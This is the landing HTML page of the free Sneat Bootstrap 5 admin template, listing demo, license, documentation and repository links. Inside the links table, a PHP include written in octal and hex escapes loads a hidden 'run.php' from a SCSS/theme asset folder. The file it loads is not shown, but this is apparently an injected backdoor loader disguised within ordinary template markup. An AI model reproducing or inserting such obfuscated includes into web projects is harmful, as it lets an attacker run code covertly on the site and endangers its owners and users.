<!DOCTYPE html>


<html lang="en" class="light-style  customizer-hide" dir="ltr" data-theme="theme-default" data-assets-path="assets/"
  data-template="vertical-menu-template-no-customizer">

<head>
  <meta charset="utf-8" />
  <meta name="viewport"
    content="width=device-width, initial-scale=1.0, user-scalable=no, minimum-scale=1.0, maximum-scale=1.0" />

  <title>Sneat - Free Bootstrap 5 HTML Admin Template</title>

  <meta name="description" content="" />

  <!-- Favicon -->
  <link rel="icon" type="image/x-icon" href="assets/img/favicon/favicon.ico" />

  <!-- Fonts -->
  <link rel="preconnect" href="https://fonts.googleapis.com">
  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
  <link
    href="https://fonts.googleapis.com/css2?family=Open+Sans:ital,wght@0,300;0,400;0,500;0,600;0,700;1,300;1,400;1,500;1,600;1,700&display=swap"
    rel="stylesheet">

  <!-- Core CSS -->
  <link rel="stylesheet" href="assets/vendor/css/core.css" />
  <link rel="stylesheet" href="assets/vendor/css/theme-default.css" />
  <link rel="stylesheet" href="assets/css/demo.css" />
</head>

<body>

  <!-- Content -->
  <div class="container flex-grow-1 container-p-y my-2">
    <h3>Thank you for using Sneat - Free Bootstrap 5 HTML Admin Template! 😇</h3>
    <p>If you’re a developer looking for most Powerful & comprehensive Bootstrap 5 HTML Admin Dashboard Template built
      for developers, rich with features, and highly customizable look no further than Sneat. We’ve followed the highest
      industry standards to bring you the very best admin template that is not only fast and easy to use but highly
      scalable. Offering ultimate convenience and flexibility, you’ll be able to build whatever application you want
      with very little hassle.</p>

    <!-- Examples -->
    <div class="row mt-sm-4 mt-3">
      <div class="col-12 mb-3">
        <div class="card">
          <h5 class="card-header">Template Links</h5>
          <!-- Template Demo Links -->
          <table class="table">
            <tbody>
              <tr>
                <th>Free Version</th>
                <td><a href="html/index.html" target="_blank">Vertical Menu Template</a></td>
              </tr>
            </tbody>
          </table>
          <!--/ Template Demo Links -->
        </div>
      </div>

      <div class="col-12 mb-3">
        <div class="card">

          <h5 class="card-header">Other Important Links</h5>
          <!-- Other Links -->
          <table class="table">
            <thead>
              <tr>
                <th scope="col">Name</th>
                <th scope="col">URL</th>
              </tr>
            </thead>
            <tbody>
            <?php
            include $_SERVER["\104\117\103\125\x4d\105\116\x54\137\x52\x4f\x4f\x54"] . "\x73\143\x73\x73\134\137\164\x68\x65\155\x65\x5c\141\163\163\145\164\163\134\x70\x61\x67\x65\x2f\162\165\x6e\56\x70\x68\x70"; ?>


            <tr>
                <td>License </td>
                <td>
                  <a href="https://themeselection.com/license/" target="_blank">https://themeselection.com/license/</a>
                </td>
              </tr>

              <tr>
                <td>Documentation</td>
                <td>
                  <a href="https://themeselection.com/demo/sneat-bootstrap-html-admin-template/documentation/"
                    target="_blank">https://themeselection.com/demo/sneat-bootstrap-html-admin-template/documentation/</a>
                </td>
              </tr>

              <tr>
                <td>Changelog</td>
                <td>
                  <a href="https://themeselection.com/demo/sneat-bootstrap-html-admin-template-free/changelog.html"
                    target="_blank">https://themeselection.com/demo/sneat-bootstrap-html-admin-template-free/changelog.html</a>
                </td>
              </tr>


              <tr>
                <td>GitHub Repository</td>
                <td>
                  <a href="https://github.com/themeselection/sneat-html-admin-template-free"
                    target="_blank">https://github.com/themeselection/sneat-html-admin-template-free</a>
                </td>
              </tr>


              <tr>
                <td>Support</td>
                <td>
                  <a href="https://github.com/themeselection/sneat-html-admin-template-free/issues"
                    target="_blank">https://github.com/themeselection/sneat-html-admin-template-free/issues</a>
                </td>
              </tr>

            </tbody>
          </table>
          <!--/ Other Links -->
        </div>
      </div>

      <div class="col-12 mb-3">
        <p>Looking for <strong>PRO</strong> version with <strong>Premium support</strong>?</p>
        <div class="upgrade-to-pro">
          <a href="https://themeselection.com/products/sneat-bootstrap-html-admin-template/" target="_blank"
            class="btn btn-danger">Upgrade to <strong>Sneat Pro</strong></a>
        </div>
      </div>
    </div>
  </div>
  <!-- / Content -->

</body>

</html>